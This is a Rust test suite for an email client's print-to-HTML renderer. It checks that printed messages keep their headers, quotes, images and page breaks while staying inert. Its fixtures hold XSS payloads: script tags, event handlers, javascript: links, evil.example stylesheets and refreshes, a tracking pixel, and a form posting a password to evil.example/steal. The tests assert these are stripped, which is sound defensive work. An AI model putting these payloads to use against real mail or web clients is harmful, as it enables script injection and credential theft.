//! The printable document: its structure, and that nothing a message says can make it act.
//!
//! Structure is asserted on the tokens an HTML tokenizer reads back, not on bytes, so a change
//! to the stylesheet or to whitespace does not break a test about what the document says.

use chrono::{DateTime, FixedOffset, TimeZone, Utc};
use html5ever::buffer_queue::BufferQueue;
use html5ever::tendril::StrTendril;
use html5ever::tokenizer::{
    Tag, TagKind, Token, TokenSink, TokenSinkResult, Tokenizer, TokenizerOpts,
};
use mail_domain::*;
use mail_mime::{Options, Pages, Remote, Script, Sheet, parse, print, print_with, remote_images};
use std::cell::RefCell;
use std::collections::BTreeMap;

fn at(n: i64) -> DateTime<Utc> {
    Utc.timestamp_opt(1_790_000_000 + n, 0).unwrap()
}

/// UTC+8, so a test that passed only because the zone was ignored would fail.
fn zone() -> FixedOffset {
    FixedOffset::east_opt(8 * 3600).unwrap()
}

fn addr(name: Option<&str>, email: &str) -> Address {
    Address {
        name: name.map(str::to_owned),
        email: email.to_owned(),
    }
}

fn message(subject: &str, date: DateTime<Utc>, body: Body) -> Message {
    Message {
        id: MessageId::generate(),
        thread: ThreadId::generate(),
        account: AccountId::generate(),
        key: MessageKey::Rfc(format!("{}@example.test", date.timestamp())),
        date,
        from: addr(Some("Ada Lovelace"), "ada@example.test"),
        reply_to: Vec::new(),
        to: vec![addr(None, "me@example.test")],
        cc: vec![addr(Some("Bo"), "bo@example.test")],
        bcc: vec![addr(None, "secret@example.test")],
        subject: subject.to_owned(),
        in_reply_to: None,
        references: Vec::new(),
        rfc_message_id: None,
        read: ReadState::Read,
        star: Star::Unstarred,
        mailbox: MailboxRole::Inbox,
        labels: Vec::new(),
        body,
        attachments: Vec::new(),
    }
}

fn fetched(text: Option<&str>) -> Body {
    Body::Present {
        text: text.map(str::to_owned),
        raw: BlobId::generate(),
    }
}

fn one(message: &Message, parsed: Option<&mail_mime::Parsed>) -> String {
    print(
        &[Sheet {
            message,
            parsed,
            remote: Remote::Blocked,
        }],
        &zone(),
        at(3_600),
        Pages::Flow,
    )
}

// --- reading the document back -------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
enum Tok {
    Open(String, Vec<(String, String)>),
    Close(String),
    Text(String),
}

struct Sink {
    tokens: RefCell<Vec<Tok>>,
}

impl TokenSink for Sink {
    type Handle = ();

    fn process_token(&self, token: Token, _line: u64) -> TokenSinkResult<()> {
        let mut tokens = self.tokens.borrow_mut();
        match token {
            Token::TagToken(Tag {
                kind, name, attrs, ..
            }) => {
                let name = name.to_string();
                match kind {
                    TagKind::StartTag => tokens.push(Tok::Open(
                        name,
                        attrs
                            .iter()
                            .map(|a| (a.name.local.to_string(), a.value.to_string()))
                            .collect(),
                    )),
                    TagKind::EndTag => tokens.push(Tok::Close(name)),
                }
            }
            Token::CharacterTokens(text) => match tokens.last_mut() {
                Some(Tok::Text(had)) => had.push_str(&text),
                _ => tokens.push(Tok::Text(text.to_string())),
            },
            _ => {}
        }
        TokenSinkResult::Continue
    }
}

fn tokens(html: &str) -> Vec<Tok> {
    let mut tendril = StrTendril::new();
    tendril.push_slice(html);
    let queue = BufferQueue::default();
    queue.push_back(tendril);
    let tokenizer = Tokenizer::new(
        Sink {
            tokens: RefCell::new(Vec::new()),
        },
        TokenizerOpts::default(),
    );
    let _ = tokenizer.feed(&queue);
    tokenizer.end();
    tokenizer.sink.tokens.into_inner()
}

fn opened<'a>(tokens: &'a [Tok], tag: &str) -> Vec<&'a [(String, String)]> {
    tokens
        .iter()
        .filter_map(|token| match token {
            Tok::Open(name, attrs) if name == tag => Some(attrs.as_slice()),
            _ => None,
        })
        .collect()
}

fn attr<'a>(attrs: &'a [(String, String)], name: &str) -> Option<&'a str> {
    attrs
        .iter()
        .find(|(key, _)| key == name)
        .map(|(_, value)| value.as_str())
}

/// The text between an element's opening tag (the `nth` of its name) and its close.
fn text_of(tokens: &[Tok], tag: &str, nth: usize) -> String {
    let start = tokens
        .iter()
        .enumerate()
        .filter(|(_, token)| matches!(token, Tok::Open(name, _) if name == tag))
        .nth(nth)
        .map(|(at, _)| at)
        .unwrap_or_else(|| panic!("no {nth}th <{tag}>"));
    let mut depth = 0;
    let mut out = String::new();
    for token in &tokens[start + 1..] {
        match token {
            Tok::Open(name, _) if name == tag => depth += 1,
            Tok::Close(name) if name == tag => {
                if depth == 0 {
                    break;
                }
                depth -= 1;
            }
            Tok::Text(text) => out.push_str(text),
            _ => {}
        }
    }
    out
}

/// Header rows as (label, value), in order, for every message.
fn header_rows(tokens: &[Tok]) -> Vec<(String, String)> {
    let count = opened(tokens, "th").len();
    (0..count)
        .map(|n| (text_of(tokens, "th", n), text_of(tokens, "td", n)))
        .collect()
}

/// Everything a document must be however hostile the message: nothing runs, nothing loads.
fn assert_inert(html: &str) {
    let tokens = tokens(html);
    for token in &tokens {
        let Tok::Open(name, attrs) = token else {
            continue;
        };
        assert!(
            !matches!(
                name.as_str(),
                "script"
                    | "iframe"
                    | "object"
                    | "embed"
                    | "form"
                    | "input"
                    | "button"
                    | "link"
                    | "base"
                    | "frame"
                    | "svg"
                    | "video"
                    | "audio"
                    | "source"
            ),
            "<{name}> in the printout:\n{html}"
        );
        for (key, value) in attrs {
            assert!(!key.starts_with("on"), "{key} on <{name}>:\n{html}");
            assert_ne!(key, "style", "inline style on <{name}>");
            assert_ne!(key, "srcset");
            if key == "src" {
                assert!(value.starts_with("data:image/"), "src {value:?}");
            }
            if key == "href" {
                assert!(
                    value.starts_with("https://")
                        || value.starts_with("http://")
                        || value.starts_with("mailto:"),
                    "href {value:?}"
                );
            }
        }
        if name == "meta" {
            let equiv = attr(attrs, "http-equiv");
            assert!(
                equiv.is_none() || equiv == Some("Content-Security-Policy"),
                "{attrs:?}"
            );
        }
    }
    // Our own stylesheet and nothing else, and it loads nothing.
    assert_eq!(opened(&tokens, "style").len(), 1, "{html}");
    let css = text_of(&tokens, "style", 0);
    assert!(!css.contains("url(") && !css.contains("@import"), "{css}");
}

// --- the tests -----------------------------------------------------------------------------

const TEXT: &str = "From: Ada Lovelace <ada@example.test>\r\n\
To: me@example.test\r\n\
Cc: Bo <bo@example.test>\r\n\
Subject: Lunch on Friday\r\n\
Content-Type: text/plain; charset=utf-8\r\n\
\r\n\
Hello,\r\n\
shall we meet at noon?\r\n\
\r\n\
Bo wrote:\r\n\
> Is Friday good for you?\r\n\
> I am free after eleven.\r\n\
\r\n\
-- \r\n\
Ada\r\n";

#[test]
fn a_text_message_prints_its_headers_in_the_given_zone_and_its_text_with_quotes_indented() {
    let parsed = parse(TEXT.as_bytes()).unwrap();
    let mut msg = message("Lunch on Friday", at(0), fetched(parsed.text.as_deref()));
    msg.attachments = vec![Attachment {
        name: "menu.pdf".to_owned(),
        mime: "application/pdf".to_owned(),
        size: 2_560,
        content: PartContent::Held(BlobId::generate()),
        inline: Inline::Attached,
    }];
    let html = one(&msg, Some(&parsed));
    assert_inert(&html);
    let tokens = tokens(&html);

    assert_eq!(text_of(&tokens, "title", 0), "Lunch on Friday");
    let date = zone()
        .timestamp_opt(1_790_000_000, 0)
        .unwrap()
        .format("%a, %-d %b %Y %H:%M +08:00")
        .to_string();
    assert_eq!(
        header_rows(&tokens),
        vec![
            ("From".into(), "Ada Lovelace <ada@example.test>".into()),
            ("To".into(), "me@example.test".into()),
            ("Cc".into(), "Bo <bo@example.test>".into()),
            ("Date".into(), date),
            ("Subject".into(), "Lunch on Friday".into()),
        ]
    );
    // A blind copy is the sender's secret, not something to put on paper.
    assert!(!html.contains("secret@example.test"));
    // The printed-on line is `now` in the same zone.
    assert!(html.contains("Printed "), "{html}");

    let body = text_of(&tokens, "div", 0);
    assert!(body.contains("Hello,"), "{body}");
    assert!(body.contains("shall we meet at noon?"), "{body}");
    // The quote is its own indented element, and the reply is not inside it.
    let quote = text_of(&tokens, "blockquote", 0);
    assert!(quote.contains("Is Friday good for you?"), "{quote}");
    assert!(quote.contains("I am free after eleven."), "{quote}");
    assert!(!quote.contains("noon"), "{quote}");
    assert!(
        html.contains("blockquote {"),
        "the stylesheet indents quotes"
    );
    // The sender's line breaks survive as breaks.
    assert!(html.contains("Hello,<br>shall we meet at noon?"), "{html}");

    let listed = text_of(&tokens, "section", 0);
    assert!(listed.contains("menu.pdf"), "{listed}");
    assert!(listed.contains("2.5 kB"), "{listed}");
}

const HTML: &str = "From: Ada Lovelace <ada@example.test>\r\n\
To: me@example.test\r\n\
Subject: Quarterly figures\r\n\
MIME-Version: 1.0\r\n\
Content-Type: multipart/related; boundary=\"rel\"\r\n\
\r\n\
--rel\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<html><body><h1>Figures</h1><p>Revenue is <b>up</b>, see <a href=\"https://example.test/q3\">the report</a>.</p>\
<p><img src=\"cid:logo@example.test\" alt=\"Logo\" width=\"40\" height=\"20\"></p>\
<p>Before <img src=\"cid:chart@example.test\" alt=\"Revenue chart\"> after</p>\
<blockquote><p>An earlier note</p></blockquote></body></html>\r\n\
--rel\r\n\
Content-Type: image/png\r\n\
Content-ID: <logo@example.test>\r\n\
Content-Disposition: inline; filename=\"logo.png\"\r\n\
Content-Transfer-Encoding: base64\r\n\
\r\n\
iVBORw0KGgo=\r\n\
--rel--\r\n";

#[test]
fn an_html_message_prints_its_blocks_with_an_inline_image_embedded_and_a_missing_one_named() {
    let parsed = parse(HTML.as_bytes()).unwrap();
    let msg = message("Quarterly figures", at(0), fetched(None));
    let html = one(&msg, Some(&parsed));
    assert_inert(&html);
    let tokens = tokens(&html);

    let body = text_of(&tokens, "div", 0);
    assert!(body.contains("Figures"), "{body}");
    assert!(body.contains("Revenue is up, see the report."), "{body}");
    assert_eq!(opened(&tokens, "strong").len(), 1);
    let links = opened(&tokens, "a");
    assert_eq!(attr(links[0], "href"), Some("https://example.test/q3"));

    // The held image is drawn from its own bytes, and is the only image.
    let images = opened(&tokens, "img");
    assert_eq!(images.len(), 1, "{html}");
    assert_eq!(
        attr(images[0], "src"),
        Some("data:image/png;base64,iVBORw0KGgo=")
    );
    assert_eq!(attr(images[0], "alt"), Some("Logo"));
    // The image the message refers to and does not hold is named where it stood.
    assert!(
        body.contains("Before [image: Revenue chart] after"),
        "{body}"
    );
    assert!(!html.contains("cid:"), "{html}");

    assert!(text_of(&tokens, "blockquote", 0).contains("An earlier note"));
}

#[test]
fn a_missing_inline_image_with_no_alt_is_named_by_its_file() {
    let raw = "From: a@example.test\r\nSubject: s\r\nMIME-Version: 1.0\r\n\
Content-Type: multipart/related; boundary=\"b\"\r\n\r\n--b\r\n\
Content-Type: text/html\r\n\r\n<p>See <img src=\"cid:pic@x\"> here</p>\r\n--b\r\n\
Content-Type: image/svg+xml\r\nContent-ID: <pic@x>\r\n\
Content-Disposition: inline; filename=\"diagram.svg\"\r\n\r\n<svg onload=\"alert(1)\"/>\r\n--b--\r\n";
    let parsed = parse(raw.as_bytes()).unwrap();
    let html = one(&message("s", at(0), fetched(None)), Some(&parsed));
    assert_inert(&html);
    // An SVG is never embedded: it is a document that can carry script.
    assert!(html.contains("See [image: diagram.svg] here"), "{html}");
    assert!(!html.contains("alert(1)"), "{html}");
}

const HOSTILE: &str = "From: mallory@example.test\r\n\
Subject: Totally normal\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<html><head>\
<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\
<link rel=\"stylesheet\" href=\"https://evil.example/track.css\">\
<style>@import url(https://evil.example/i.css); body { background: url(https://evil.example/bg.png) }</style>\
<base href=\"https://evil.example/\">\
<script>document.write('pwned')</script>\
</head><body onload=\"alert('load')\">\
<p onclick=\"alert('click')\" style=\"background:url(https://evil.example/p.png)\">Dear customer</p>\
<img src=\"https://tracker.example/open.gif?u=42\" alt=\"pixel\" width=\"1\" height=\"1\">\
<img src=\"https://images.example/hero.jpg\" alt=\"Our new range\">\
<img src=\"javascript:alert(1)\"><img src=\"data:image/svg+xml;base64,PHN2Zy8+\">\
<form action=\"https://evil.example/steal\"><input name=\"password\"><button>Log in</button></form>\
<iframe src=\"https://evil.example/frame\"></iframe>\
<object data=\"https://evil.example/x.swf\"></object>\
<a href=\"javascript:alert('link')\">Click</a> <a href=\"https://shop.example/\">Shop</a>\
<svg><script>alert('svg')</script></svg>\
</body></html>\r\n";

#[test]
fn a_hostile_html_body_prints_inert() {
    let parsed = parse(HOSTILE.as_bytes()).unwrap();
    let html = one(
        &message("Totally normal", at(0), fetched(None)),
        Some(&parsed),
    );
    assert_inert(&html);

    for gone in [
        "evil.example",
        "alert(",
        "pwned",
        "javascript:",
        "open.gif",
        "hero.jpg",
        "password",
        "@import",
    ] {
        assert!(!html.contains(gone), "{gone:?} survived:\n{html}");
    }
    assert!(html.contains("Dear customer"));
    // A tracking pixel is not mentioned at all.
    assert!(
        !html.contains("tracker.example") && !html.contains("pixel"),
        "{html}"
    );
    // A remote image is named, with who would have learned the mail was printed.
    assert!(
        html.contains("[image: Our new range, from images.example]"),
        "{html}"
    );
    // The one safe link keeps its address.
    let tokens = tokens(&html);
    let hrefs: Vec<_> = opened(&tokens, "a")
        .into_iter()
        .filter_map(|attrs| attr(attrs, "href"))
        .collect();
    assert!(
        hrefs
            .iter()
            .all(|href| href.starts_with("https://shop.example")),
        "{hrefs:?}"
    );
    // The document refuses to load anything even if something slipped through.
    let csp = opened(&tokens, "meta")
        .into_iter()
        .find_map(|attrs| {
            (attr(attrs, "http-equiv") == Some("Content-Security-Policy"))
                .then(|| attr(attrs, "content"))
                .flatten()
        })
        .unwrap();
    assert!(csp.contains("default-src 'none'"), "{csp}");
}

#[test]
fn a_subject_cannot_escape_its_element() {
    let subject = "</title><script>alert(1)</script><h1 onclick=\"x()\">\"quoted\" & 'single'";
    let msg = message(subject, at(0), fetched(Some("hi")));
    let html = one(&msg, None);
    assert_inert(&html);
    let tokens = tokens(&html);
    assert_eq!(text_of(&tokens, "title", 0), subject);
    assert_eq!(text_of(&tokens, "h2", 0), subject);
    assert!(opened(&tokens, "script").is_empty());
    assert!(opened(&tokens, "h1").is_empty());

    // Names and addresses are the sender's words too.
    let mut msg = message("s", at(0), fetched(Some("hi")));
    msg.from = addr(
        Some("<script>x</script>"),
        "a\"><img src=x onerror=y>@example.test",
    );
    msg.attachments = vec![Attachment {
        name: "<img src=x onerror=alert(1)>.pdf".to_owned(),
        mime: "application/pdf".to_owned(),
        size: 1,
        content: PartContent::Remote {
            section: "2".to_owned(),
        },
        inline: Inline::Attached,
    }];
    let html = one(&msg, None);
    assert_inert(&html);
    assert!(opened(&tokens_of(&html), "img").is_empty(), "{html}");
}

fn tokens_of(html: &str) -> Vec<Tok> {
    tokens(html)
}

#[test]
fn a_message_whose_body_is_not_downloaded_prints_its_headers_and_says_so() {
    let msg = message("Only headers", at(0), Body::Absent);
    let html = one(&msg, None);
    assert_inert(&html);
    let tokens = tokens(&html);
    assert_eq!(header_rows(&tokens)[0].1, "Ada Lovelace <ada@example.test>");
    assert!(html.contains("has not been downloaded"), "{html}");
    assert!(opened(&tokens, "div").is_empty(), "no body element: {html}");
}

#[test]
fn a_fetched_body_whose_bytes_are_gone_prints_the_stored_text() {
    let msg = message(
        "Kept text",
        at(0),
        fetched(Some("the text we kept\nline two")),
    );
    let html = one(&msg, None);
    assert!(html.contains("the text we kept"), "{html}");
    assert!(!html.contains("has not been downloaded"));
}

#[test]
fn a_thread_prints_every_message_in_the_order_given() {
    let raws = [
        "From: a@example.test\r\nSubject: Plan\r\n\r\nfirst message\r\n",
        "From: b@example.test\r\nSubject: Re: Plan\r\n\r\nsecond message\r\n",
        "From: c@example.test\r\nSubject: Re: Plan\r\n\r\nthird message\r\n",
    ];
    let parsed: Vec<_> = raws
        .iter()
        .map(|raw| parse(raw.as_bytes()).unwrap())
        .collect();
    let messages: Vec<_> = ["Plan", "Re: Plan", "Re: Plan"]
        .iter()
        .enumerate()
        .map(|(n, subject)| {
            let mut msg = message(subject, at(n as i64 * 60), fetched(None));
            msg.from = addr(None, &format!("{}@example.test", ["a", "b", "c"][n]));
            msg
        })
        .collect();
    let sheets: Vec<_> = messages
        .iter()
        .zip(&parsed)
        .map(|(message, parsed)| Sheet {
            message,
            parsed: Some(parsed),
            remote: Remote::Blocked,
        })
        .collect();

    let html = print(&sheets, &zone(), at(9_999), Pages::Flow);
    assert_inert(&html);
    let tokens = tokens(&html);
    assert_eq!(opened(&tokens, "article").len(), 3);
    assert_eq!(text_of(&tokens, "title", 0), "Plan");
    assert!(text_of(&tokens, "h1", 0).contains("3 messages"));
    let first = html.find("first message").unwrap();
    let second = html.find("second message").unwrap();
    let third = html.find("third message").unwrap();
    assert!(first < second && second < third);
    let froms: Vec<_> = header_rows(&tokens)
        .into_iter()
        .filter(|(label, _)| label == "From")
        .map(|(_, value)| value)
        .collect();
    assert_eq!(
        froms,
        ["a@example.test", "b@example.test", "c@example.test"]
    );
    // Flowing: no message is forced onto a new page.
    assert!(
        opened(&tokens, "article")
            .iter()
            .all(|attrs| attr(attrs, "class") == Some("message"))
    );

    let paged = print(&sheets, &zone(), at(9_999), Pages::PerMessage);
    let classes: Vec<_> = opened(&tokens_of(&paged), "article")
        .iter()
        .map(|attrs| attr(attrs, "class").unwrap().to_owned())
        .collect();
    assert_eq!(classes, ["message", "message new-page", "message new-page"]);
    assert!(paged.contains("break-before: page"));
}

#[test]
fn the_stylesheet_sets_page_margins_and_keeps_a_header_block_on_one_page() {
    let html = one(&message("s", at(0), Body::Absent), None);
    assert!(html.contains("@page"), "{html}");
    let headers_rule = html
        .lines()
        .skip_while(|line| !line.starts_with(".headers {"))
        .take(3)
        .collect::<String>();
    assert!(
        headers_rule.contains("break-inside: avoid"),
        "{headers_rule}"
    );
}

#[test]
fn inline_images_are_not_listed_as_attachments() {
    let mut msg = message("s", at(0), fetched(Some("x")));
    msg.attachments = vec![
        Attachment {
            name: "logo.png".to_owned(),
            mime: "image/png".to_owned(),
            size: 10,
            content: PartContent::Held(BlobId::generate()),
            inline: Inline::Embedded {
                cid: "logo@x".to_owned(),
            },
        },
        Attachment {
            name: "big.zip".to_owned(),
            mime: "application/zip".to_owned(),
            size: 3 * 1024 * 1024,
            content: PartContent::Remote {
                section: "3".to_owned(),
            },
            inline: Inline::Attached,
        },
    ];
    let html = one(&msg, None);
    let tokens = tokens(&html);
    let listed = text_of(&tokens, "section", 0);
    assert!(listed.contains("Attachments (1)"), "{listed}");
    assert!(listed.contains("big.zip (3.0 MB)"), "{listed}");
    assert!(!listed.contains("logo.png"), "{listed}");
}

/// What a paginating renderer reads, on every element that carries it: which elements it keeps
/// whole, and which start a page.
fn marked(tokens: &[Tok], name: &str, value: &str) -> Vec<String> {
    tokens
        .iter()
        .filter_map(|token| match token {
            Tok::Open(tag, attrs) if attr(attrs, name) == Some(value) => Some(tag.clone()),
            _ => None,
        })
        .collect()
}

const STRUCTURED: &str = "From: a@example.test\r\n\
Subject: Plan\r\n\
MIME-Version: 1.0\r\n\
Content-Type: multipart/related; boundary=\"rel\"\r\n\
\r\n\
--rel\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<p>Figures:</p><table><tr><td>Q1</td><td>3</td></tr></table>\
<p><img src=\"cid:logo@example.test\" alt=\"Logo\" width=\"40\" height=\"20\"></p>\
<blockquote><p>An earlier note</p></blockquote>\r\n\
--rel\r\n\
Content-Type: image/png\r\n\
Content-ID: <logo@example.test>\r\n\
Content-Disposition: inline; filename=\"logo.png\"\r\n\
Content-Transfer-Encoding: base64\r\n\
\r\n\
iVBORw0KGgo=\r\n\
--rel--\r\n";

#[test]
fn the_builder_marks_what_a_page_end_must_not_cut_and_where_a_page_starts() {
    let parsed = parse(STRUCTURED.as_bytes()).unwrap();
    let mut first = message("Plan", at(0), fetched(None));
    first.attachments = vec![Attachment {
        name: "plan.pdf".to_owned(),
        mime: "application/pdf".to_owned(),
        size: 10,
        content: PartContent::Held(BlobId::generate()),
        inline: Inline::Attached,
    }];
    let second = message("Re: Plan", at(60), fetched(Some("Agreed.")));
    let sheets = [
        Sheet {
            message: &first,
            parsed: Some(&parsed),
            remote: Remote::Blocked,
        },
        Sheet {
            message: &second,
            parsed: None,
            remote: Remote::Blocked,
        },
    ];
    let paged = tokens(&print(&sheets, &zone(), at(9_999), Pages::PerMessage));
    // Each header, the table, the image, the quote and the list of attachments.
    assert_eq!(
        marked(&paged, "data-break-inside", "avoid"),
        ["header", "table", "p", "blockquote", "section", "header"]
    );
    // The second message starts a page; the first is at the top of one already.
    assert_eq!(marked(&paged, "data-break-before", "page"), ["article"]);
    let flowing = tokens(&print(&sheets, &zone(), at(9_999), Pages::Flow));
    assert!(marked(&flowing, "data-break-before", "page").is_empty());
    assert_eq!(marked(&flowing, "data-break-inside", "avoid").len(), 6);
}

#[test]
fn a_message_says_its_cjk_script_where_it_says_one() {
    let raw = |headers: &str, body: &[u8]| {
        let mut raw =
            format!("From: a@example.test\r\nSubject: s\r\nMIME-Version: 1.0\r\n{headers}\r\n\r\n")
                .into_bytes();
        raw.extend_from_slice(body);
        parse(&raw).unwrap()
    };
    let cases = [
        // The header names the language.
        (
            raw(
                "Content-Language: ja\r\nContent-Type: text/plain; charset=utf-8",
                "漢字".as_bytes(),
            ),
            Some("ja"),
        ),
        // The charset only one of the four uses.
        (
            raw(
                "Content-Type: text/plain; charset=euc-kr",
                b"\xc7\xd1\xb1\xb9\xbe\xee",
            ),
            Some("ko"),
        ),
        (
            raw(
                "Content-Type: text/plain; charset=big5",
                b"\xb7\x7c\xc4\xb3",
            ),
            Some("zh-Hant"),
        ),
        // The text alone: characters Simplified Chinese spells its own way.
        (
            raw(
                "Content-Type: text/plain; charset=utf-8",
                "会议记录已经寄出".as_bytes(),
            ),
            Some("zh-Hans"),
        ),
        // Latin, and nothing says otherwise.
        (
            raw("Content-Type: text/plain; charset=utf-8", b"Hello there"),
            None,
        ),
    ];
    for (parsed, want) in cases {
        let msg = message("s", at(0), fetched(None));
        let html = one(&msg, Some(&parsed));
        let articles = opened_owned(&tokens(&html), "article");
        assert_eq!(
            attr(&articles[0], "data-script"),
            want,
            "{:?} {:?}",
            parsed.content_language,
            parsed.charset
        );
    }
    // A body that is not here is judged by its subject and stored text.
    let stored = message("お知らせ", at(0), fetched(Some("よろしくお願いします")));
    let html = one(&stored, None);
    assert_eq!(
        attr(&opened_owned(&tokens(&html), "article")[0], "data-script"),
        Some(Script::Japanese.tag())
    );
}

fn opened_owned(tokens: &[Tok], tag: &str) -> Vec<Vec<(String, String)>> {
    opened(tokens, tag).into_iter().map(<[_]>::to_vec).collect()
}

const REMOTE: &str = "From: a@example.test\r\n\
Subject: Photos\r\n\
MIME-Version: 1.0\r\n\
Content-Type: text/html; charset=utf-8\r\n\
\r\n\
<p>Look:</p>\
<p><img src=\"https://images.example.test/team.png\" alt=\"Team\" width=\"200\" height=\"100\"></p>\
<p><img src=\"https://images.example.test/other.png\" alt=\"Other\" width=\"200\" height=\"100\"></p>\
<p><img src=\"https://track.example.test/pixel.gif\" width=\"1\" height=\"1\"></p>\
<blockquote><p><img src=\"https://images.example.test/team.png\" alt=\"Again\"></p></blockquote>\r\n";

const PNG: &str = "data:image/png;base64,iVBORw0KGgo=";

#[test]
fn without_consent_no_remote_image_is_listed_or_drawn() {
    let parsed = parse(REMOTE.as_bytes()).unwrap();
    let msg = message("Photos", at(0), fetched(None));
    let sheet = Sheet {
        message: &msg,
        parsed: Some(&parsed),
        remote: Remote::Blocked,
    };
    assert!(remote_images(&[sheet]).is_empty());
    let html = print(&[sheet], &zone(), at(0), Pages::Flow);
    assert!(opened(&tokens(&html), "img").is_empty(), "{html}");
    assert!(
        !html.contains("team.png"),
        "the address reached the printout"
    );
    assert!(
        html.contains("[image: Team, from images.example.test]"),
        "{html}"
    );
}

#[test]
fn with_consent_the_fetched_images_are_drawn_and_the_rest_named() {
    let parsed = parse(REMOTE.as_bytes()).unwrap();
    let msg = message("Photos", at(0), fetched(None));
    let none = BTreeMap::new();
    let asked = remote_images(&[Sheet {
        message: &msg,
        parsed: Some(&parsed),
        remote: Remote::Allowed(&none),
    }]);
    // Each once, in order, and never the spacer: it would be drawn as nothing.
    assert_eq!(
        asked,
        [
            "https://images.example.test/team.png",
            "https://images.example.test/other.png"
        ]
    );
    // One came back an image; the other came back as something that is not one to draw.
    let fetched_ = BTreeMap::from([
        (asked[0].clone(), PNG.to_owned()),
        (
            asked[1].clone(),
            "data:text/html;base64,PHNjcmlwdD4=".to_owned(),
        ),
    ]);
    let sheet = Sheet {
        message: &msg,
        parsed: Some(&parsed),
        remote: Remote::Allowed(&fetched_),
    };
    let options = Options {
        style: ".x { color: red; }",
        missing_note: Some("Some pictures are named, not drawn."),
        ..Options::new(Pages::Flow)
    };
    let html = print_with(&[sheet], &zone(), at(0), &options);
    assert_inert(&html);
    let toks = tokens(&html);
    let sources: Vec<_> = opened(&toks, "img")
        .iter()
        .map(|attrs| attr(attrs, "src").unwrap().to_owned())
        .collect();
    assert_eq!(
        sources,
        [PNG, PNG],
        "the consented image, twice where it stood"
    );
    assert!(!html.contains("text/html"), "{html}");
    assert!(
        html.contains("[image: Other, from images.example.test]"),
        "{html}"
    );
    assert!(html.contains(".x { color: red; }"));
    assert_eq!(
        text_of(&toks, "p", 1),
        "Some pictures are named, not drawn."
    );
}

#[test]
fn the_note_is_written_only_when_an_image_is_named() {
    let msg = message("s", at(0), fetched(Some("Plain words.")));
    let sheet = Sheet {
        message: &msg,
        parsed: None,
        remote: Remote::Blocked,
    };
    let options = Options {
        missing_note: Some("NOTE"),
        ..Options::new(Pages::Flow)
    };
    let html = print_with(&[sheet], &zone(), at(0), &options);
    assert!(!html.contains("NOTE"), "{html}");
}
